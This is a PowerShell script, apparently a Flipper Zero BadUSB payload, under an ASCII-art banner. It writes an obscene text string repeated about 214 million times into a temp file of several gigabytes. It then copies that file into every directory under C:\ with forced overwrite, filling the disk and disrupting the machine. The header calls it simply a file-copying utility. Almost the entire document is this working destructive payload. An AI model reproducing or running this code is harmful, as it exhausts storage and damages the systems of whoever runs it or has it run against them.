##################################################################################################################################################################
##################################################################################################################################################################
<#
                 _..--+~/@-~--.
             _-=~      (  .   "}
          _-~     _.--=.\ \""""
        _~      _-       \ \_\
       =      _=          '--'
      '      =                             .
     :      :       ____                   '=_. ___
___  |      ;                            ____ '~--.~.
     ;      ;                               _____  } |
  ___=       \ ___ __     __..-...__           ___/__/__
     :        =_     _.-~~          ~~--.__
_____ \         ~-+-~                   ___~=_______
     ~@#~~ == ...______ __ ___ _--~~--_
                                                    =
██████╗ ███████╗ █████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗███████╗ ██████╗ ██╗ ██████╗ █████╗ 
██╔══██╗██╔════╝██╔══██╗████╗  ██║██╔════╝██║  ██║██╔════╝╚══███╔╝██╔════╝███║██╔════╝██╔══██╗
██████╔╝███████╗███████║██╔██╗ ██║██║     ███████║█████╗    ███╔╝ ██║     ╚██║███████╗╚██████║
██╔══██╗╚════██║██╔══██║██║╚██╗██║██║     ██╔══██║██╔══╝   ███╔╝  ██║      ██║██╔═══██╗╚═══██║
██║  ██║███████║██║  ██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗╚██████╗ ██║╚██████╔╝█████╔╝
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝ ╚═════╝ ╚════╝ 
Script Version: 1
OS Version Script was written on: Microsoft Windows 11 Pro : 10.0.25100 Build 26100
PSVersion 5.1.26100.2161 : PSEdition Desktop : Build Version 10.0.26100.2161
Flipper Zero FirmWare mntm-001 https://momentum-fw.dev/update/
Description of Script: 
The provided PowerShell script consists of three functions: Get-DirectoryPaths, Create-File, and Copy-FileEveryWhere. The script is designed to retrieve all directory paths on the system, create a custom file, and copy the created file to all retrieved directories.
#>
##################################################################################################################################################################
#==============================Beginning==========================================================================================================================
##################################################################################################################################################################
function Get-DirectoryPaths {
    param (
        [Parameter(Mandatory=$true)]
        [string]$RootPath
    )

    # Check if the specified root path exists
    if (-Not (Test-Path -Path $RootPath -PathType Container)) {
        Write-Output "The specified root path does not exist or is not a directory."
        return
    }

    # Initialize an empty array to store directory paths
    $directoryPaths = @()

    # Get all directory paths within the specified root path
    $directoryPaths += Get-ChildItem -Path $RootPath -Recurse -Directory | ForEach-Object { $_.FullName }

    # Return the array of directory paths
    return $directoryPaths
}

Function Create-File {
    # Access the temp folder path
    $tempFolder = $env:Temp
    
    # Define Custom Name for file
    $customFileName = "BigFlipper.txt"
    
    # Combine the temp folder path with the custom file name
    $fullPath = Join-Path -Path $tempFolder -ChildPath $customFileName
    
    # Create the file with the custom name
    $file = New-Item -Path $fullPath -ItemType "file" -Force
    
    # Define the string to output
    $stringToOutput += " Flipper Fucked "*214748364
    
    # Output the string to the custom named file
    $stringToOutput | Out-File -FilePath $file.FullName
    
    # Output the full path of the new temp file
    #Write-Host "The temp file path is: $fullPath"

   Return $fullPath
}

Function Copy-FileEveryWhere {

# Define the root directory path
$rootPath = "C:\"

# Get all directory paths within the specified root path
$allDirectories = Get-DirectoryPaths -RootPath $rootPath

# Create the custom file
$fullPath = Create-File

    # Loop through each directory in the $allDirectories array
    FOREACH ( $Directory IN $allDirectories) {
        # Copy the file to the current directory
        Copy-Item -Path $fullPath -Destination $Directory -Force
        # Output the message indicating the file was copied
        Write-Host "File was copied to $Directory"
    }
}

# Copy the custom file to all directories
Copy-FileEveryWhere
##################################################################################################################################################################
#==============================End================================================================================================================================
##################################################################################################################################################################
